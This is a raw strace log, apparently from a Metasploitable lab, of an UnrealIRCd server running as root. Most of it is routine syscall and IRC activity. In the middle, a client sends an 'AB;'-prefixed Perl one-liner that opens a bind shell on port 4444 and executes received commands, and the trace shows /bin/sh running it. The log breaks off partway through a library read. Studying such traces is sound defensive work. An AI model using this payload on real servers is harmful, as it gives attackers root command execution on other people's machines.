4519  20:27:40.389477 select(1024, [2 3 4 7 9], [], NULL, {0, 660000}) = 1 (in [9], left {0, 0})
4519  20:27:41.047224 clock_gettime(CLOCK_MONOTONIC, {48870, 864245637}) = 0
4519  20:27:41.047247 recv(9, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  20:27:41.047278 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047296 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047311 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047325 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047338 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047352 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047365 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047379 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047392 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047405 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047418 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047431 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047444 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047524 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047539 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047553 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047567 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047581 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047596 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047623 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047636 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047649 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.047666 gettimeofday({1495672061, 47669}, NULL) = 0
4519  20:27:41.047678 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 870000})
4519  20:27:41.177106 clock_gettime(CLOCK_MONOTONIC, {48870, 994115026}) = 0
4519  20:27:41.177106 time(NULL)        = 1495672061
4519  20:27:41.177106 time(NULL)        = 1495672061
4519  20:27:41.177112 gettimeofday({1495672061, 177116}, NULL) = 0
4519  20:27:41.177124 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  20:27:41.177164 clock_gettime(CLOCK_MONOTONIC, {48870, 994176701}) = 0
4519  20:27:41.177174 gettimeofday({1495672061, 177178}, NULL) = 0
4519  20:27:41.177186 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  20:27:41.177225 clock_gettime(CLOCK_MONOTONIC, {48870, 994238066}) = 0
4519  20:27:41.177237 accept(2, 0, NULL) = 5
4519  20:27:41.177259 getpeername(5, {sa_family=AF_INET, sin_port=htons(33473), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  20:27:41.177292 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:27:41.177305 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:27:41.177318 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  20:27:41.177331 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  20:27:41.177342 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  20:27:41.177353 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  20:27:41.177366 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  20:27:41.177381 clock_gettime(CLOCK_MONOTONIC, {48870, 994394066}) = 0
4519  20:27:41.177392 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  20:27:41.177414 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  20:27:41.177424 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  20:27:41.177433 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  20:27:41.177443 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  20:27:41.177458 send(6, "\210%\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  20:27:41.177514 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  20:27:41.177572 gettimeofday({1495672061, 177594}, NULL) = 0
4519  20:27:41.177602 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  20:27:41.187401 clock_gettime(CLOCK_MONOTONIC, {48871, 4409971}) = 0
4519  20:27:41.187401 recvfrom(6, "\210%\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\17\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  20:27:41.187401 close(6)          = 0
4519  20:27:41.187402 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  20:27:41.187402 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  20:27:41.187402 time(NULL)        = 1495672061
4519  20:27:41.187402 time(NULL)        = 1495672061
4519  20:27:41.187402 gettimeofday({1495672061, 187402}, NULL) = 0
4519  20:27:41.187403 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:27:41.187461 clock_gettime(CLOCK_MONOTONIC, {48871, 4474899}) = 0
4519  20:27:41.187473 gettimeofday({1495672061, 187476}, NULL) = 0
4519  20:27:41.187484 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 930000})
4519  20:27:41.257093 clock_gettime(CLOCK_MONOTONIC, {48871, 74114191}) = 0
4519  20:27:41.257116 recv(7, "PRIVMSG  #testit1 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  20:27:41.257149 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257167 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257182 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257196 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257210 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257224 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257238 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257252 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257265 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257279 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257293 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257306 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257320 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257333 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257347 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257361 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257374 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257388 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257402 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257416 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257436 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257450 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 150000}, ...}) = 0
4519  20:27:41.257467 gettimeofday({1495672061, 257471}, NULL) = 0
4519  20:27:41.257479 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  20:27:41.257607 clock_gettime(CLOCK_MONOTONIC, {48871, 74620551}) = 0
4519  20:27:41.257619 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  20:27:41.257648 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  20:27:41.257669 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  20:27:41.257682 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  20:27:41.257696 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 12516
12516 20:27:41.257773 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
12516 20:27:41.257788 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
12516 20:27:41.257799 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
12516 20:27:41.257813 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
12516 20:27:41.257922 brk(0)            = 0x80f9000
12516 20:27:41.257946 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12516 20:27:41.257963 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7efe000
12516 20:27:41.257981 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
12516 20:27:41.257998 open("/etc/ld.so.cache", O_RDONLY) = 1
12516 20:27:41.258012 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12516 20:27:41.258031 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ef6000
12516 20:27:41.258041 close(1)          = 0
12516 20:27:41.258052 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12516 20:27:41.258068 open("/lib/libncurses.so.5", O_RDONLY) = 1
12516 20:27:41.258094 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
12516 20:27:41.258192 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
12516 20:27:41.258210 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ec6000
12516 20:27:41.258222 mmap2(0xb7ef3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7ef3000
12516 20:27:41.258240 close(1)          = 0
12516 20:27:41.258253 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12516 20:27:41.258267 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
12516 20:27:41.258286 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
12516 20:27:41.258377 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
12516 20:27:41.258394 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ec2000
12516 20:27:41.258405 mmap2(0xb7ec4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7ec4000
12516 20:27:41.258423 close(1)          = 0
12516 20:27:41.258434 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12516 20:27:41.258448 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
12516 20:27:41.258463 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12516 20:27:41.258552 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12516 20:27:41.258569 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ec1000
12516 20:27:41.258591 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d72000
12516 20:27:41.258603 mmap2(0xb7ebb000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ebb000
12516 20:27:41.258618 mmap2(0xb7ebe000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ebe000
12516 20:27:41.258633 close(1)          = 0
12516 20:27:41.258656 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d71000
12516 20:27:41.258669 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d716b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12516 20:27:41.258726 mprotect(0xb7ebb000, 4096, PROT_READ) = 0
12516 20:27:41.258764 munmap(0xb7ef6000, 29913) = 0
12516 20:27:41.258792 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12516 20:27:41.258806 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
12516 20:27:41.258830 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfeda0a0) = -1 ENOTTY (Inappropriate ioctl for device)
12516 20:27:41.258862 brk(0)            = 0x80f9000
12516 20:27:41.258872 brk(0x80fa000)    = 0x80fa000
12516 20:27:41.258885 brk(0x80fb000)    = 0x80fb000
12516 20:27:41.258902 getuid32()        = 0
12516 20:27:41.258911 getgid32()        = 0
12516 20:27:41.258921 geteuid32()       = 0
12516 20:27:41.258930 getegid32()       = 0
12516 20:27:41.258944 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12516 20:27:41.258958 time(NULL)        = 1495672061
12516 20:27:41.258971 brk(0x80fc000)    = 0x80fc000
12516 20:27:41.258986 brk(0x80fd000)    = 0x80fd000
12516 20:27:41.259007 open("/proc/meminfo", O_RDONLY) = 1
12516 20:27:41.259029 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
12516 20:27:41.259048 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7efd000
12516 20:27:41.259059 read(1, "MemTotal:      1035240 kB\nMemFree:        150560 kB\nBuffers:        141740 kB\nCached:         499564 kB\nSwapCached:          0 kB\nActive:         524588 kB\nInactive:       305612 kB\nHighTotal:      131008 kB\nHighFree:          248 kB\nLowTotal:       904232 kB\nLowFree:        150312 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            1652 kB\nWriteback:           0 kB\nAnonPages:      188880 kB\nMapped:          52056 kB\nSlab:            32740 kB\nSReclaimable:    20276 kB\nSUnreclaim:      12464 kB\nPageTables:       2924 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   707968 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
12516 20:27:41.259207 close(1)          = 0
12516 20:27:41.259219 munmap(0xb7efd000, 4096) = 0
12516 20:27:41.259231 brk(0x80fe000)    = 0x80fe000
12516 20:27:41.259258 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12516 20:27:41.259271 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
12516 20:27:41.259284 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12516 20:27:41.259296 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
12516 20:27:41.259308 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
12516 20:27:41.259320 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
12516 20:27:41.259333 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
12516 20:27:41.259345 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
12516 20:27:41.259358 uname({sys="Linux", node="metasploitable", ...}) = 0
12516 20:27:41.259408 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
12516 20:27:41.259426 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12516 20:27:41.259445 brk(0x8100000)    = 0x8100000
12516 20:27:41.259457 getcwd("/etc/unreal", 4096) = 12
12516 20:27:41.259472 getpid()          = 12516
12516 20:27:41.259488 getppid()         = 4519
12516 20:27:41.259505 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
12516 20:27:41.259525 stat64("/sbin/sh", 0xbfeda078) = -1 ENOENT (No such file or directory)
12516 20:27:41.259538 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12516 20:27:41.259556 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
12516 20:27:41.259590 socket(PF_FILE, SOCK_STREAM, 0) = 1
12516 20:27:41.259604 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12516 20:27:41.259616 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
12516 20:27:41.259638 close(1)          = 0
12516 20:27:41.259650 socket(PF_FILE, SOCK_STREAM, 0) = 1
12516 20:27:41.259660 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
12516 20:27:41.259671 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
12516 20:27:41.259689 close(1)          = 0
12516 20:27:41.259705 open("/etc/nsswitch.conf", O_RDONLY) = 1
12516 20:27:41.259720 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
12516 20:27:41.259741 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7efd000
12516 20:27:41.259752 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
12516 20:27:41.259802 read(1, "", 4096) = 0
12516 20:27:41.259812 close(1)          = 0
12516 20:27:41.259822 munmap(0xb7efd000, 4096) = 0
12516 20:27:41.259838 open("/etc/ld.so.cache", O_RDONLY) = 1
12516 20:27:41.259851 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
12516 20:27:41.259867 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ef6000
12516 20:27:41.259878 close(1)          = 0
12516 20:27:41.259888 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12516 20:27:41.259903 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
12516 20:27:41.259918 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 